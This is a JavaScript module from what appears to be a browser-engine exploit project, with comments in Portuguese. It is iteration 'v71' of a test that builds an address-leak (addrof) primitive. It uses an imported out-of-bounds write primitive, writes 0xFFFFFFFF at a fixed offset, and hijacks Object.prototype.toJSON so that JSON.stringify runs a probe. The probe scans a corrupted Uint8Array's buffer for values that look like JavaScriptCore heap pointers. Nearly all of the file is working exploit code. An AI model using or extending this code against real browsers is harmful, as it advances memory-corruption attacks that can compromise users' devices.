// js/script3/testArrayBufferVictimCrash.mjs (v71_FuzzCorruptedVictimItself)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
    // getStableConfusedArrayBuffer NÃO é usado nesta versão
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI = "OriginalHeisenbug_TypedArrayAddrof_v71_FuzzCorruptedVictimItself";

// Variável global/módulo para captura de dados
let captured_fuzz_from_victim_buffer_v71 = null;

let victim_typed_array_ref_v71 = null; // O alvo principal do JSON.stringify E do fuzzing
let probe_call_count_v71 = 0;
let all_probe_interaction_details_v71 = [];
// first_call_details_object_ref_v71 não é o foco principal aqui

const VICTIM_BUFFER_SIZE_V71 = 0x1000; // Buffer da vítima maior
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Este offset é relativo ao oob_dataview_real, não diretamente ao victim_buffer.
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V71 = 5; // Deve ser baixo, esperamos apenas 1-2 chamadas relevantes
// Offsets para ler do victim_typed_array_ref_v71.buffer
const FUZZ_OFFSETS_V71 = [
    0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, // Cabeçalhos comuns
    0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78, // Área próxima ao OOB write (0x7C)
    0x7C, // Exatamente o offset da escrita OOB (interpretado como início de um qword)
    0x80, 0x88, 0x90, 0x98, 0xA0
];

function toJSON_TA_Probe_FuzzCorruptedVictim_v71() {
    probe_call_count_v71++;
    const call_num = probe_call_count_v71;
    const this_obj_type = Object.prototype.toString.call(this);
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI,
        this_type: this_obj_type,
        this_is_victim: (this === victim_typed_array_ref_v71),
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${this_obj_type}. IsVictim? ${current_call_details.this_is_victim}.`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V71) { all_probe_interaction_details_v71.push({...current_call_details}); return { recursion_stopped_v71: true, call: call_num };}

        // CASO PRINCIPAL: 'this' é o victim_typed_array_ref_v71 (esperado na Call #1)
        if (current_call_details.this_is_victim && this_obj_type === '[object Uint8Array]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE VICTIM Uint8Array! Fuzzing its buffer...`, "critical");
            let fuzzed_reads = [];
            try {
                if (!this.buffer || !(this.buffer instanceof ArrayBuffer)) {
                    throw new Error("Victim's buffer is not an ArrayBuffer or is null.");
                }
                let view = new DataView(this.buffer); // Buffer do victim_typed_array_ref_v71
                for (const offset of FUZZ_OFFSETS_V71) {
                    let low=0, high=0, ptr_str="N/A", dbl=NaN, err_msg=null;
                    if (view.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg }); }
                    else {
                        low=view.getUint32(offset,true); high=view.getUint32(offset+4,true);
                        ptr_str=new AdvancedInt64(low,high).toString(true);
                        let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high; dbl=(new Float64Array(tb))[0];
                        fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg});
                    }
                    logS3(`    VictimBufferFuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
                }
                captured_fuzz_from_victim_buffer_v71 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `VictimBufferFuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
            } catch (e) {
                current_call_details.error_in_probe = e.message;
                current_call_details.fuzz_capture_status = `Error during VictimBufferFuzz: ${e.message}`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "error");
                captured_fuzz_from_victim_buffer_v71 = fuzzed_reads; // Salva o que conseguiu ler
            }
            all_probe_interaction_details_v71.push({...current_call_details});
            return { marker_victim_fuzzed_v71: true, call_num_processed: call_num }; // Retorno simples
        }
        // Outros casos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected type: ${this_obj_type}. IsVictim? ${current_call_details.this_is_victim}`, "warn");
            all_probe_interaction_details_v71.push({...current_call_details});
            return `ProcessedCall${call_num}_Type${this_obj_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v71.push({...current_call_details});
        return { error_marker_v71: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_FuzzCorruptedVictimItself() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (FuzzCorruptedVictimItself) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI} Init...`;

    captured_fuzz_from_victim_buffer_v71 = null;
    probe_call_count_v71 = 0;
    all_probe_interaction_details_v71 = [];
    victim_typed_array_ref_v71 = null; // Será o alvo principal

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];
    let addrof_A_result = { success: false, msg: "Addrof VictimBuffer: Default (v71)" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        // Configurar o ambiente OOB ANTES de criar a vítima que será corrompida.
        // A escrita OOB crítica precisa de um DataView (oob_dataview_real) para operar.
        // O LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET é um offset DENTRO deste oob_dataview_real.
        // O que ele corrompe depende do que está mapeado naquela região de memória NO MOMENTO DA ESCRITA.
        // A estratégia clássica é que ele corrompa metadados de um ArrayBufferView (como nosso victim_typed_array_ref_v71)
        // que foi alocado logo após o oob_array_buffer_real.
        // Para esta v71, vamos criar a vítima *depois* de configurar OOB e *antes* da escrita crítica.

        await triggerOOB_primitive({ force_reinit: true }); // Configura oob_array_buffer_real e oob_dataview_real

        victim_typed_array_ref_v71 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE_V71));
        logS3(`  Victim Uint8Array (victim_typed_array_ref_v71) criado. Tamanho do buffer: ${victim_typed_array_ref_v71.buffer.byteLength}`, "info", FNAME_CURRENT_TEST);
        // É crucial que a escrita OOB afete os metadados do victim_typed_array_ref_v71 ou seu buffer.
        // A forma como isso acontece depende do layout da memória e da estratégia de alocação do motor JS.
        // O offset 0x7C é um valor mágico de testes anteriores.

        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100); // Pausa para permitir que a corrupção se manifeste

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FuzzCorruptedVictim_v71, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v71)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v71);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info");
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }

            logS3("STEP 3: Analyzing fuzz data captured from victim's buffer (v71)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            if (captured_fuzz_from_victim_buffer_v71 && Array.isArray(captured_fuzz_from_victim_buffer_v71)) {
                heisenbugIndication = true; // Fuzzing no buffer da vítima ocorreu
                logS3(`  V71_ANALYSIS: Processing ${captured_fuzz_from_victim_buffer_v71.length} captured fuzz reads from VictimBuffer.`, "good");
                for (const read_attempt of captured_fuzz_from_victim_buffer_v71) {
                    if (read_attempt.error) continue;
                    const highVal = parseInt(read_attempt.high, 16);
                    const lowVal = parseInt(read_attempt.low, 16);
                    let isPotentialPtr=false; /* ... (lógica de validação de ponteiro da v64) ... */
                    if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPotentialPtr=(highVal===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lowVal&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);}if(!isPotentialPtr&&(highVal>0||lowVal>0x10000)&&(highVal<0x000F0000)&&((lowVal&0x7)===0)){isPotentialPtr=true;}

                    if(isPotentialPtr && !(highVal === 0 && lowVal === 0) ){
                        addrof_A_result.success = true;
                        addrof_A_result.msg = `V71 SUCCESS (VictimBuffer Fuzz): Potential Ptr ${read_attempt.int64} from offset ${read_attempt.offset}`;
                        logS3(`  !!!! V71 POTENTIAL POINTER FOUND from VictimBuffer at offset ${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
                        break;
                    }
                }
                if(!addrof_A_result.success){ addrof_A_result.msg = `V71 Fuzzed VictimBuffer did not yield pointer. First read: ${captured_fuzz_from_victim_buffer_v71[0]?.int64 || 'N/A'}`; }
            } else if (!addrof_A_result.success) {
                addrof_A_result.msg = "V71 No fuzz data captured from VictimBuffer.";
            }

            if(addrof_A_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI}: Addr SUCCESS!`;}
            else if(heisenbugIndication || (stringifyOutput_parsed && stringifyOutput_parsed.marker_victim_fuzzed_v71)){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V71_FCVI}: No Heisenbug?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        if (all_probe_interaction_details_v71 && Array.isArray(all_probe_interaction_details_v71)) {
            collected_probe_details_for_return = all_probe_interaction_details_v71.map(d => (d && typeof d === 'object' ? {...d} : d));
        } else { collected_probe_details_for_return = []; }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v71}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof VictimBuffer: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        victim_typed_array_ref_v71 = null; all_probe_interaction_details_v71 = []; probe_call_count_v71 = 0; captured_fuzz_from_victim_buffer_v71 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain, stringifyResult: stringifyOutput_parsed, rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: collected_probe_details_for_return, total_probe_calls: probe_call_count_v71,
        addrof_A_result: addrof_A_result, addrof_B_result: {success:false, msg:"N/A for v71"} // Só temos um alvo de addrof
    };
};
